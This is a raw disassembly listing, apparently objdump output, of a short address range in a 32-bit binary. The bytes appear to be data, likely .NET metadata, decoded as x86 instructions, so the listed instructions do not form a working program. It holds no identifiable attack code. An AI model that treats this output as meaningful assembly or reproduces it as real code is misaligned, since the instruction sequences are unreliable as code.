  405cfc:	55                   	push   %ebp
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 6c 06 5c          	add    %ch,0x5c(%esi,%eax,1)
  405d03:	02 06                	add    (%esi),%al
  405d05:	00 75 0f             	add    %dh,0xf(%ebp)
  405d08:	5c                   	pop    %esp
  405d09:	02 06                	add    (%esi),%al
  405d0b:	00 02                	add    %al,(%edx)
  405d0d:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d12:	8d 14 5c             	lea    (%esp,%ebx,2),%edx
  405d15:	02 06                	add    (%esi),%al
  405d17:	00 2b                	add    %ch,(%ebx)
  405d19:	12 5c 02 16          	adc    0x16(%edx,%eax,1),%bl
  405d1d:	00 44 12 74          	add    %al,0x74(%edx,%edx,1)
  405d21:	15 1a 00 0c 14       	adc    $0x140c001a,%eax
  405d26:	95                   	xchg   %eax,%ebp
  405d27:	1a 1a                	sbb    (%edx),%bl
  405d29:	00 80 11 95 1a 8b    	add    %al,-0x74e56aef(%eax)
  405d2f:	01 c5                	add    %eax,%ebp
  405d31:	14 00                	adc    $0x0,%al
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 31                	add    %dh,(%ecx)
  405d37:	19 95 1a 06 00 4c    	sbb    %edx,0x4c00061a(%ebp)
  405d3d:	15 f3 0f 06 00       	adc    $0x60ff3,%eax
  405d42:	7a 00                	jp     0x405d44
  405d44:	f3 0f 06             	repz clts
  405d47:	00 ea                	add    %ch,%dl
  405d49:	0f f3 0f             	psllq  (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 f3                	add    %dh,%bl
  405d51:	0f 06                	clts
  405d53:	00 f4                	add    %dh,%ah
  405d55:	12 0e                	adc    (%esi),%cl
  405d57:	1d 06 00 32 10       	sbb    $0x10320006,%eax
  405d5c:	0e                   	push   %cs
  405d5d:	1d 06 00 a7 07       	sbb    $0x7a70006,%eax
  405d62:	f3 0f 06             	repz clts
  405d65:	00 85 10 f3 0f 1e    	add    %al,0x1e0ff310(%ebp)
  405d6b:	00 29                	add    %ch,(%ecx)
  405d6d:	11 bc 17 06 00 af 1d 	adc    %edi,0x1daf0006(%edi,%edx,1)
  405d74:	bd 0e 06 00 d7       	mov    $0xd700060e,%ebp
  405d79:	0e                   	push   %cs
  405d7a:	bd 0e 06 00 7a       	mov    $0x7a00060e,%ebp
  405d7f:	06                   	push   %es
  405d80:	bd 0e 06 00 6f       	mov    $0x6f00060e,%ebp
  405d85:	03 f3                	add    %ebx,%esi
  405d87:	0f 06                	clts
  405d89:	00 1a                	add    %bl,(%edx)
  405d8b:	06                   	push   %es
  405d8c:	9d                   	popf
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 25 14 55 00 0a    	add    %ah,0xa005514
  405d95:	00 a9 18 55 00 06    	add    %ch,0x6005518(%ecx)
  405d9b:	00 d0                	add    %dl,%al
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	02 15 00 00 12 00    	add    0x120000,%dl
  405da8:	9d                   	popf
  405da9:	05 d0 12 06 00       	add    $0x612d0,%eax
  405dae:	12 00                	adc    (%eax),%al
  405db0:	c1 02 06             	roll   $0x6,(%edx)
  405db3:	00 b7 10 f3 0f 06    	add    %dh,0x60ff310(%edi)
  405db9:	00 2b                	add    %ch,(%ebx)
  405dbb:	1d 54 11 06 00       	sbb    $0x61154,%eax
  405dc0:	33 08                	xor    (%eax),%ecx
  405dc2:	f3 0f 06             	repz clts
  405dc5:	00 0d 15 f3 0f 06    	add    %cl,0x60ff315
  405dcb:	00 f6                	add    %dh,%dh
  405dcd:	05 f3 0f 22 00       	add    $0x220ff3,%eax
  405dd2:	51                   	push   %ecx
  405dd3:	12 6b 13             	adc    0x13(%ebx),%ch
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	e3 16                	jecxz  0x405df0
  405dda:	6b 13 22             	imul   $0x22,(%ebx),%edx
  405ddd:	00 92 13 6b 13 12    	add    %dl,0x12136b13(%edx)
  405de3:	00 8a 13 b1 15 22    	add    %cl,0x2215b113(%edx)
  405de9:	00 fb                	add    %bh,%bl
  405deb:	16                   	push   %ss
  405dec:	6b 13 06             	imul   $0x6,(%ebx),%edx
  405def:	00 6b 16             	add    %ch,0x16(%ebx)
  405df2:	0e                   	push   %cs
  405df3:	1d 06 00 f0 11       	sbb    $0x11f00006,%eax
  405df8:	f3 0f 06             	repz clts
  405dfb:	00 72 16             	add    %dh,0x16(%edx)
  405dfe:	0e                   	push   %cs
  405dff:	1d 12 00 26 13       	sbb    $0x13260012,%eax
  405e04:	0e                   	push   %cs
  405e05:	1d 06 00 a9 0f       	sbb    $0xfa90006,%eax
  405e0a:	0e                   	push   %cs
  405e0b:	1d 06 00 fb 00       	sbb    $0xfb0006,%eax
  405e10:	0e                   	push   %cs
  405e11:	1d 06 00 da 11       	sbb    $0x11da0006,%eax
  405e16:	f3 0f 06             	repz clts
  405e19:	00 0b                	add    %cl,(%ebx)
  405e1b:	10 0e                	adc    %cl,(%esi)
  405e1d:	1d 06 00 47 05       	sbb    $0x5470006,%eax
  405e22:	0e                   	push   %cs
  405e23:	1d 06 00 0b 05       	sbb    $0x50b0006,%eax
  405e28:	0e                   	push   %cs
  405e29:	1d 06 00 4c 10       	sbb    $0x104c0006,%eax
  405e2e:	0e                   	push   %cs
  405e2f:	1d 06 00 26 05       	sbb    $0x5260006,%eax
  405e34:	0e                   	push   %cs
  405e35:	1d 06 00 c3 11       	sbb    $0x11c30006,%eax
  405e3a:	0e                   	push   %cs
  405e3b:	1d 06 00 b3 13       	sbb    $0x13b30006,%eax
  405e40:	f3 0f 06             	repz clts
  405e43:	00 a1 1c f3 0f 06    	add    %ah,0x60ff31c(%ecx)
  405e49:	00 15 18 b1 15 06    	add    %dl,0x615b118
  405e4f:	00 d3                	add    %dl,%bl
  405e51:	05 f3 0f 06 00       	add    $0x60ff3,%eax
  405e56:	26 03 0e             	add    %es:(%esi),%ecx
  405e59:	1d 06 00 c7 00       	sbb    $0xc70006,%eax
  405e5e:	f3 0f 06             	repz clts
  405e61:	00 c1                	add    %al,%cl
  405e63:	05 f3 0f 06 00       	add    $0x60ff3,%eax
  405e68:	3f                   	aas
  405e69:	06                   	push   %es
  405e6a:	f3 0f 06             	repz clts
  405e6d:	00 44 18 5c          	add    %al,0x5c(%eax,%ebx,1)
  405e71:	02 06                	add    (%esi),%al
  405e73:	00 38                	add    %bh,(%eax)
  405e75:	08 5c 02 0a          	or     %bl,0xa(%edx,%eax,1)
  405e79:	00 b6 0f 13 11 0a    	add    %dh,0xa11130f(%esi)
  405e7f:	00 37                	add    %dh,(%edi)
  405e81:	05 13 11 00 00       	add    $0x1113,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	40                   	inc    %eax
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 ce                	add    %cl,%dh
  405e97:	0f 8e 1a 05 00 01    	jle    0x14063b7
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 27    	add    %al,0x27001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	8e 1a                	mov    (%edx),%ds
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 af    	add    %al,-0x50ffefff(%ecx)
  405eb3:	19 9b 11 05 00 13    	sbb    %ebx,0x13000511(%ebx)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 c2                	add    %al,%dl
  405ec1:	12 0b                	adc    (%ebx),%cl
  405ec3:	0f 05                	syscall
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	47                   	inc    %edi
  405ecf:	17                   	pop    %ss
  405ed0:	4b                   	dec    %ebx
  405ed1:	14 05                	adc    $0x5,%al
  405ed3:	00 1e                	add    %bl,(%esi)
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 8d    	add    %al,-0x72ffefff(%ecx)
  405edd:	10 4b 14             	adc    %cl,0x14(%ebx)
  405ee0:	05 00 1e 00 2d       	add    $0x2d001e00,%eax
  405ee5:	00 81 01 10 00 5b    	add    %al,0x5b001001(%ecx)
  405eeb:	13 4b 14             	adc    0x14(%ebx),%ecx
  405eee:	05 00 1e 00 2f       	add    $0x2f001e00,%eax
  405ef3:	00 81 01 10 00 6c    	add    %al,0x6c001001(%ecx)
  405ef9:	15 4b 14 05 00       	adc    $0x5144b,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 5a    	add    %al,0x5a001001(%ecx)
  405f07:	0f 4b 14 05 00 1e 00 	cmovnp 0x36001e00(,%eax,1),%edx
  405f0e:	36 
  405f0f:	00 81 01 10 00 66    	add    %al,0x66001001(%ecx)
  405f15:	15 4b 14 05 00       	adc    $0x5144b,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 01                	add    %al,(%ecx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 9b    	add    %al,-0x64ffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	4b                   	dec    %ebx
  405f33:	14 05                	adc    $0x5,%al
  405f35:	00 23                	add    %ah,(%ebx)
  405f37:	00 3e                	add    %bh,(%esi)
  405f39:	00 81 01 10 00 75    	add    %al,0x75001001(%ecx)
  405f3f:	1d 4b 14 05 00       	sbb    $0x5144b,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 a8    	add    %al,-0x57ffefff(%ecx)
  405f4d:	19 8a 19 05 00 24    	sbb    %ecx,0x24000519(%edx)
  405f53:	00 46 00             	add    %al,0x0(%esi)
  405f56:	83 01 10             	addl   $0x10,(%ecx)
  405f59:	00 80 00 00 00 05    	add    %al,0x5000000(%eax)
  405f5f:	00 25 00 4b 00 01    	add    %ah,0x1004b00
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 fa 0f 05    	add    %cl,0x50ffa01
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	fa                   	cli
  405f79:	0f 05                	syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 58 01             	add    %bl,0x1(%eax)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 38                	add    %bh,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 b1 17 c4 0d 05    	add    %dh,0x50dc417(%ecx)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 5d 10             	add    %bl,0x10(%ebp)
  405fb0:	c4 0d 05 00 2f 00    	les    0x2f0005,%ecx
  405fb6:	5f                   	pop    %edi
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 7b 1c             	add    %bh,0x1c(%ebx)
  405fbe:	c4 0d 05 00 31 00    	les    0x310005,%ecx
  405fc4:	63 00                	arpl   %eax,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	df 0d c4 0d 05 00    	fisttps 0x50dc4
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	0c 08                	or     $0x8,%al
  405fda:	c4 0d 39 00 3a 00    	les    0x3a0039,%ecx
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 9c 17 c4 0d 05 00 	add    %bl,0x50dc4(%edi,%edx,1)
  405fec:	47                   	inc    %edi
  405fed:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405ff3:	00 a6 17 c4 0d 05    	add    %ah,0x50dc417(%esi)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 9c    	add    %al,-0x63ffefff(%ecx)
  406003:	12 c4                	adc    %ah,%al
  406005:	0d 05 00 47 00       	or     $0x470005,%eax
  40600a:	a2 00 00 01 00       	mov    %al,0x10000
  40600f:	00 49 01             	add    %cl,0x1(%ecx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 1b                	add    %bl,(%ebx)
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 b6 18 	add    %ah,0x18b60016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 c3                	add    %al,%bl
  406031:	18 12                	sbb    %dl,(%edx)
  406033:	00 16                	add    %dl,(%esi)
  406035:	00 0b                	add    %cl,(%ebx)
  406037:	11 12                	adc    %edx,(%edx)
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 12                	add    %dl,(%edx)
  40603d:	0f 12 00             	movlps (%eax),%xmm0
  406040:	16                   	push   %ss
  406041:	00 4d 13             	add    %cl,0x13(%ebp)
  406044:	12 00                	adc    (%eax),%al
  406046:	16                   	push   %ss
  406047:	00 46 06             	add    %al,0x6(%esi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 05 1d 12 00 16    	add    %al,0x1600121d
  406053:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406059:	00 9b 08 12 00 16    	add    %bl,0x16001208(%ebx)
  40605f:	00 4e 08             	add    %cl,0x8(%esi)
  406062:	12 00                	adc    (%eax),%al
  406064:	16                   	push   %ss
  406065:	00 95 08 15 00 16    	add    %dl,0x16001508(%ebp)
  40606b:	00 a8 0d 12 00 16    	add    %ch,0x1600120d(%eax)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 d3                	add    %dl,%bl
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 6b 02             	add    %ch,0x2(%ebx)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 74 03 12          	add    %dh,0x12(%ebx,%eax,1)
  406087:	00 16                	add    %dl,(%esi)
  406089:	00 5a 1c             	add    %bl,0x1c(%edx)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 bc 12 12 00 11 00 	add    %bh,0x110012(%edx,%edx,1)
  406096:	80 04 21 00          	addb   $0x0,(%ecx,%eiz,1)
  40609a:	11 00                	adc    %eax,(%eax)
  40609c:	65 04 25             	gs add $0x25,%al
  40609f:	00 11                	add    %dl,(%ecx)
  4060a1:	00 35 04 29 00 11    	add    %dh,0x11002904
  4060a7:	00 cb                	add    %cl,%bl
  4060a9:	03 2d 00 11 00 4d    	add    0x4d001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b0 03 30 00 11    	add    %dh,0x11003003(%eax)
  4060b9:	00 93 03 34 00 31    	add    %dl,0x31003403(%ebx)
  4060bf:	00 79 03             	add    %bh,0x3(%ecx)
  4060c2:	37                   	aaa
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 e7                	add    %ah,%bh
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 1b                	add    %bl,(%ebx)
  4060cd:	04 3a                	add    $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 fd                	add    %bh,%ch
  4060d3:	03 34 00             	add    (%eax,%eax,1),%esi
  4060d6:	16                   	push   %ss
  4060d7:	00 a0 12 dc 00 06    	add    %ah,0x600dc12(%eax)
  4060dd:	06                   	push   %es
  4060de:	9b                   	fwait
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	70 02                	jo     0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 ce 01             	or     $0x1,%dh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060f6:	fe 01                	incb   (%ecx)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 65 17             	add    %ah,0x17(%ebp)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 9a 0d 3a 00 51 80 	sbbb   $0x80,0x51003a0d(%edx)
  40610e:	96                   	xchg   %eax,%esi
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	8d 0d 3a 00 51 80    	lea    0x8051003a,%ecx
  40611a:	71 0d                	jno    0x406129
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	09 1d 29 00 21 00    	or     %ebx,0x210029
  406126:	ea 1c 29 00 31 00 0a 	ljmp   $0xa00,$0x3100291c
  40612d:	1a 29                	sbb    (%ecx),%ch
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 77 01             	add    %esi,0x1(%edi)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	5d                   	pop    %ebp
  406139:	05 8f 01 01 00       	add    $0x1018f,%eax
  40613e:	99                   	cltd
  40613f:	10 30                	adc    %dh,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 ba 11 3a 00 01    	add    %bh,0x1003a11(%edx)
  406149:	00 99 10 30 01 01    	add    %bl,0x1013010(%ecx)
  40614f:	00 45 14             	add    %al,0x14(%ebp)
  406152:	c7 01 01 00 a2 07    	movl   $0x7a20001,(%ecx)
  406158:	12 00                	adc    (%eax),%al
  40615a:	01 00                	add    %eax,(%eax)
  40615c:	82 07 12             	addb   $0x12,(%edi)
  40615f:	00 01                	add    %al,(%ecx)
  406161:	00 a4 0a 37 00 01 00 	add    %ah,0x10037(%edx,%ecx,1)
  406168:	02 08                	add    (%eax),%cl
  40616a:	02 02                	add    (%edx),%al
  40616c:	01 00                	add    %eax,(%eax)
  40616e:	b3 1a                	mov    $0x1a,%bl
  406170:	c7 01 01 00 99 10    	movl   $0x10990001,(%ecx)
  406176:	30 01                	xor    %al,(%ecx)
  406178:	01 00                	add    %eax,(%eax)
  40617a:	9c                   	pushf
  40617b:	1c 06                	sbb    $0x6,%al
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	9b                   	fwait
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	02 12                	add    (%edx),%dl
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 55 0f 02          	adcb   $0x2,0xf(%ebp)
  40618f:	02 56 80             	add    -0x80(%esi),%dl
  406192:	8b 12                	mov    (%edx),%edx
  406194:	02 02                	add    (%edx),%al
  406196:	56                   	push   %esi
  406197:	80 a1 1c 02 02 56 80 	andb   $0x80,0x5602021c(%ecx)
  40619e:	c8 0c 02 02          	enter  $0x20c,$0x2
  4061a2:	56                   	push   %esi
  4061a3:	80 f5 13             	xor    $0x13,%ch
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 85 10 02 02 56 80 	addb   $0x80,0x56020210(%ebp)
  4061b6:	20 19                	and    %bl,(%ecx)
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 3f 06             	cmpb   $0x6,(%edi)
  4061be:	02 02                	add    (%edx),%al
  4061c0:	56                   	push   %esi
  4061c1:	80 a7 07 02 02 56 80 	andb   $0x80,0x56020207(%edi)
  4061c8:	5a                   	pop    %edx
  4061c9:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061ce:	11 02                	adc    %eax,(%edx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 a2 10 0a 00 01    	add    %ah,0x1000a10(%edx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	17                   	pop    %ss
  4061e9:	15 0e 00 01 00       	adc    $0x1000e,%eax
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 1d 17 1d 00 01    	add    %bl,0x1001d17
  4061fb:	00 50 28             	add    %dl,0x28(%eax)
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	91                   	xchg   %eax,%ecx
  406203:	00 3c 0d 1d 00 01 00 	add    %bh,0x1001d(,%ecx,1)
  40620a:	c0 28 00             	shrb   $0x0,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 64 1a 3d    	add    %dl,0x3d1a6408(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 72 1a 42    	add    %dl,0x421a7208(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 48 1a 48    	add    %dl,0x481a4808(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 56 1a 4d    	add    %dl,0x4d1a5608(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 a4 13 53    	add    %dl,0x5313a408(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 af 13 58    	add    %dl,0x5813af08(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 1b 0b 5e    	add    %dl,0x5e0b1b08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 2a                	or     %ch,(%edx)
  406283:	0b 62 00             	or     0x0(%edx),%esp
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 e1 19 5e    	add    %dl,0x5e19e108(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 ec 19 62    	add    %dl,0x6219ec08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 c7 0a 67    	add    %dl,0x670ac708(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 d5 0a 6c    	add    %dl,0x6c0ad508(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 42 03 1d    	add    %dl,0x1d034208(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 52 03 72    	add    %dl,0x72035208(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 f2 02 77    	add    %dl,0x7702f208(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 8b 0b 67    	add    %dl,0x670b8b08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 94 0b 6c    	add    %dl,0x6c0b9408(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 f1 0e 7b    	add    %dl,0x7b0ef108(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 fe 0e 7f    	add    %dl,0x7f0efe08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e8 0c 1d    	add    %dl,0x1d0ce808(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 f9 0c 72    	add    %dl,0x720cf908(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 37 1a 0a    	add    %dl,0xa1a3700(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 63 07 84    	add    %dl,-0x7bf89d00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 8d 08 89    	add    %dl,-0x76f77300(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 66 19 0a    	add    %dl,0xa196600(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 a3 02 94 00 10    	add    %ah,0x10009402(%ebx)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 c4                	add    %al,%ah
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 9f 19 9a    	add    %dl,-0x65e66100(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
